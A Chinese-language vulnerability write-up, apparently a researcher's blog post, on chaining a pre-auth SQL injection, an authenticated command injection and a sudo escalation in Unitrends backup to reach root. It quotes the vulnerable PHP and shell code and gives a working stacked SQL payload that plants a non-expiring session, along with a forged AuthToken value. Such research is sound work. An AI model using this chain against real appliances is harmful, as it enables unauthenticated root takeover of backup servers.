---
title: "Unitrends backup pre-auth RCE"
date: 2024-09-20T09:10:24+08:00
tags: ["rce", "unitrends"]
---

三个漏洞组合成的认证前root rce，做个小记录

### 认证前SQLI（有条件）

在文件 `/grid/config/request.php` 中

```php
<?php

/* If this script has PHP errors, bail out */
error_reporting(-1);
ini_set("display_errors", 1);
ini_set("html_errors", 0);

libxml_use_internal_errors(true);
$str = file_get_contents('php://input');
if (isset($str)) {
	$xml = simplexml_load_string($str);
	if (!$xml) {
		echo "Failed: ill-formed XML.\n";
		libxml_clear_errors();
		exit(1);
	}
	else {
		$ret = process_request($str);
		if ($ret === false) {
			$msg = bp_error();
			echo "$msg";
			exit(1);
		}
		else {
			echo "Success: $ret";
			exit(0);
		}
	}
}
else {
	echo "Error: Invalid request.";
	exit(1);
}

?>
```

`$_POST` 完全可控，经xml解析后直接传入 `process_request`，这是个扩展函数，扩展位于 `/usr/lib64/php/modules/bpl.so`，在扩展中会重新dlopen `/usr/lib64/lobbpext.so.1`，在二进制中找到函数 `process_request`
 
![](/img/unitrends-pre-auth-rce/1.png)

其中 `hostname_value`、`identity_value` 与 `asset_tag_value` 都是从xml中取出来的数据，`pgVExec` 是执行的原生sql并没有使用参数绑定，存在SQL注入

![](/img/unitrends-pre-auth-rce/2.png)

> 前置条件

在取xml的值之前，会有一次条件判断

![](/img/unitrends-pre-auth-rce/3.png)

`cmc_openvpn server confirm` 必须为 `true`，命令实现为

```bash
function confirm
{
	test -f ${KEYS_DIR}/dh2048.pem &&
	test -f ${OPENVPN_DIR}/bin/updateCRL &&
	test -f ${OPENVPN_DIR}/crl.pem &&
	test -f ${OPENVPN_DIR}/inbound.conf &&
	test -f ${KEYS_DIR}/ca.key &&
	test -f ${KEYS_DIR}/ca.crt
	
	return $?
}

case $1 in
	server)
		if [ $# -eq 2 -a "$2" = confirm ]
		then
			confirm
			if [ $? -eq 0 ]
			then
				echo -n "true"
			else
				echo -n "false"
			fi
			exit 0
```

这里可以通过post一个单节点空内容的xml来判断是否可以做攻击

### 认证后命令注入

在 `api/includes/systems.php` 中的 `update` 函数中，有一个switch分支

```php
case 'add-management':
	if (is_numeric($which) && $which > 0) {
		$data['id'] = (int)$which;
	}
	$system = $this->BP->get_system_info($data['id']);
	if ($system !== false) {
		//$credentialCheck = $this->hasValidCredentials($system['name'], $data['credentials']['username'], $data['credentials']['password']);
		$credentialCheck = $this->functions->grantManagementToLocalSystem($system['name'], $data['credentials']['username'], $data['credentials']['password']);
		if ($credentialCheck === true) {
			$status = $this->BP->add_mgmt_to_replication_source($system['id']);
		} else {
			$status = array('error' => 500, 'message' => $credentialCheck);
		}
	} else {
		$status = array('error' => 500, 'message' => 'System with this id was not found.');;
	}
	break;
```

 `$data` 的值为 `json_decode(file_get_contents("php://input"))` 完全可控，其中 `credentials` 带入了 `grantManagementToLocalSystem` 函数中，函数定义在 `api/includes/function.lib.php`
	
> 这里必须有一个存在的 `$system` 的值，这个值是从数据库中获取，一般都会存在一个，id为1

```php
public function grantManagementToLocalSystem($ip, $username, $password) {
	$granted = true;
	$localHostInfo = $this->BP->get_hostname();
	if ($localHostInfo !== false) {
		$host = $localHostInfo['name'];
		$grantCommand = sprintf("/usr/bp/bin/rungrant.php  '%s'  '%s'  '%s'  '%s'", $ip, $username, $password, $host);
	  //  global $Log;
	  //  $Log->writeVariable("command is " . $grantCommand);
		exec($grantCommand, $outputArray, $returnValue);
		// if $returnValue is 0, okay, leave $granted as true.
		if ($returnValue !== 0) {
			$granted = implode("\n", $outputArray);
		}
	} else {
		$granted = "Could not determine local appliance host name.";
	}
	return $granted;
}
```

由于 `$username` 和 `$password` 可控，并且直接带入了命令字符串中，造成命令注入

### 提权

在 `/etc/sudoers` 中可以看到针对apache有一些规则

```
Defaults:apache targetpw, timestamp_timeout=0
apache  ALL = NOPASSWD:  /usr/bp/bin/footprintReportUtil, \
                        /var/www/html/grid/portal/rflr_manage.php, \
                       /usr/bp/bin/cmc_restrict_ports, \
              PASSWD: /usr/bin/passwd, \
                      /sbin/shutdown, \
                      /bin/bash, \
                      /usr/bin/whoami
postgres ALL=(root) NOPASSWD: /usr/bp/bin/elk/elk_job_handler.sh,/usr/bp/bin/elk/elk_alert_handler.sh
```

跟进 `/grid.portal/rflr_manage.php` ，这是一个只能在cli下运行的php文件

```php
$options = getopt($shortopts, $longopts);
foreach (array_keys($options) as $opts) switch ($opts) {
  case 'create_zip':
    $createZip = true;
    $start_dir = (isset($options['create_zip']) ? $options['create_zip'] : '');
    $opt++;
  break;

else if ($createZip === true) {
  $result = doCreateZip($start_dir, $zipDelFiles);
}

function doCreateZip($startDir, $deleteAfterZip)
{
  global $log;
  global $zipBaseDir;
  global $debug;

  $func = "doCreateZip()";
  fprintf($log, "%s, %s\n", $func, $startDir);

  $zipDir = "$startDir";
  if ($debug) { fprintf($log, "%s, startDir: %s\n", $func, $zipDir); }

  $zipDir  = (substr($zipDir, 0, 1) == '/' ? $zipDir : '/'.$zipDir);
  $zipDir .= (substr($zipDir, -1,1) == '/' ? '' : '/');

  if ($debug) { fprintf($log,"%s, zipDir: %s\n", $func, $zipDir); }
  # define the zip file
  $zipFileName = "Unitrends-Restore" . rand(0, 999) . ".zip";
  $zipFileFull = $zipDir . $zipFileName;

  if (!isset($zipDir) || !strstr($zipDir, $zipBaseDir)) {
    fprintf(STDERR, "Starting directory is not allowed!");
    exit(1);
  }

  $cmd = "cd $zipDir; find . ! -type l | zip -0 $zipFileFull -@ > /dev/null 2>&1";
  if ($debug) { fprintf($log,"%s, find filelist and create zip cmd: %s\n", $func, $cmd); }
  system($cmd, $res);
```

传入参数 `create_zip` 经过一些目录处理后，直接带入了 `$cmd` 字符串，之后直接使用 `system` 执行，造成命令注入，所以可以在 `apache:apache` 下使用sudo运行这个文件，在 `create_zip` 参数中写入高权限命令，即可完成提权，需要注意的是这里有一个判断，不然会exit掉

```php
if (!isset($zipDir) || !strstr($zipDir, $zipBaseDir))
```

`$zipBaseDir = "_rflr"`，也就是说命令字符串中需要包含这个，随便构造一下即可 

![](/img/unitrends-pre-auth-rce/4.png)

### 利用

由于注入点可以堆叠，所以可以考虑直接向数据库写数据，这里的表结构中存在一张sessions表，判断用户登录也是先从header的authtoken中取出uuid进行比较，所以可以直接堆叠写入一个不过期的session

```
1234';insert into sessions(user_id,uuid,expiration) values(1,'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',9999999999);--
```

之后伪造一次 cookie

```
base64_encode("v0:aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1")
djA6YWFhYWFhYWEtYWFhYS1hYWFhLWFhYWEtYWFhYWFhYWFhYWFhOjE=
```

这个值就可以作为认证后的AuthToken头使用，此时拥有了访问认证后功能的能力

![](/img/unitrends-pre-auth-rce/5.png)

之后就可以使用认证后命令注入，配合提权直接使用root权限进行命令执行

![](/img/unitrends-pre-auth-rce/6.png)
